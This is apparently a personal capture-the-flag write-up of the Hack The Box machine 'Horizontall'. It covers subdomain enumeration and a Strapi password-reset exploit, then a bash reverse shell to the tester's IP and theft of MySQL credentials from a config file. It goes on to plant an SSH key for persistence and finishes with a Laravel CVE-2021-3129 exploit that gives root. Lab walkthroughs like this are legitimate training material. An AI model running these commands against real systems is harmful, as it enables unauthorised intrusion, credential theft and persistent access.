# Horizontal

## Open ports

- 22
- 80 

- Enumerating dirs gave me nothing so I jumped to enumering subdomains

- Doing `~/go/bin/gobuster vhost -u http://horizontall.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt` I was able to find `Found: api-prod.horizontall.htb (Status: 200) [Size: 413]`

- Enumerating dirs on api-prod.horizontall.htb I was able to find 

```bash
/admin                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
/.                    (Status: 200) [Size: 413]
/ADMIN                (Status: 200) [Size: 854]
/Users                (Status: 403) [Size: 60]
/Reviews              (Status: 200) [Size: 507]
```

- `http://api-prod.horizontall.htb/admin/init` gives Strapi version

- `https://www.exploit-db.com/exploits/50239` found exploit do Strapi CMS 3.0.0-beta.17.4

- Running the exploit i could recover the admin passowrd

```bash
[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzNDA3NjYxLCJleHAiOjE2NDU5OTk2NjF9.RPKktFT8wzNi6enWDO0QnGoSF02Za078TrC8PODeS5I
```

- Doing `bash -c 'bash -i >& /dev/tcp/10.10.15.102/9999 0>&1'` inside the exploit I could get a rev shell
- Using `python3 -c 'import pty;pty.spawn("/bin/bash")'` to get a better shell and did `export TERM=xterm` and now we are strapi user

- Found sql creds while enumerating files

```bash
strapi@horizontall:~/myapi/config/environments/development$ cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

- Doing `netstat -tulpn | grep LISTEN` found this 

```bash
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1876/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

- Port 8000 looks interesting so I need to ssh port forwarding but first i did `curl 127.0.0.1:8000` and got this

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Laravel</title>
    </head>
    <body class="antialiased">
        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0">
                <div class="mt-8 bg-white dark:bg-gray-800 overflow-hidden shadow sm:rounded-lg">
                    <div class="grid grid-cols-1 md:grid-cols-2">
                        <div class="p-6">

                            <div class="ml-12">
                                <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
                                    Laravel has wonderful, thorough documentation covering every aspect of the framework. Whether you are new to the framework or have previous experience with Laravel, we recommend reading all of the documentation from beginning to end.
                                </div>
                            </div>
                        </div>

                        <div class="p-6 border-t border-gray-200 dark:border-gray-700 md:border-t-0 md:border-l">
                            <div class="flex items-center">
                                <svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" class="w-8 h-8 text-gray-500"><path d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                <div class="ml-4 text-lg leading-7 font-semibold"><a href="https://laracasts.com" class="underline text-gray-900 dark:text-white">Laracasts</a></div>
                            </div>

                            <div class="ml-12">
                                <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
                                    Laracasts offers thousands of video tutorials on Laravel, PHP, and JavaScript development. Check them out, see for yourself, and massively level up your development skills in the process.
                                </div>
                            </div>
                        </div>

                        <div class="p-6 border-t border-gray-200 dark:border-gray-700">
                            <div class="flex items-center">
                                <svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" class="w-8 h-8 text-gray-500"><path d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z"></path></svg>
                                <div class="ml-4 text-lg leading-7 font-semibold"><a href="https://laravel-news.com/" class="underline text-gray-900 dark:text-white">Laravel News</a></div>
                            </div>

                            <div class="ml-12">
                                <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
                                    Laravel News is a community driven portal and newsletter aggregating all of the latest and most important news in the Laravel ecosystem, including new package releases and tutorials.
                                </div>
                            </div>
                        </div>
                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```

- So searching for Lavarel v8 PHP v7.4.18 in google I found this `https://github.com/nth347/CVE-2021-3129_exploit.git` but before using this be sure you have php installed in your machine

- So before exploiting I need to get SSH and port forwarding to reach the laravel app

```bash
ssh-keygen
store in ./key
cat key.pub and copy to clipboard
mkdir ~/.ssh inside horizontall machine
echo "paste the public key" > ~/.ssh/authorized_keys
chmod 6000 key from your machine
ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb from your machine
```

- Now I can do `http://localhost:8000` and find the laravel app, so now its time to exploit and got root

- Using the exploit I got the root flag

![image](https://user-images.githubusercontent.com/12052283/151637871-710ee87c-7437-4499-8dd3-5e444732ac66.png)
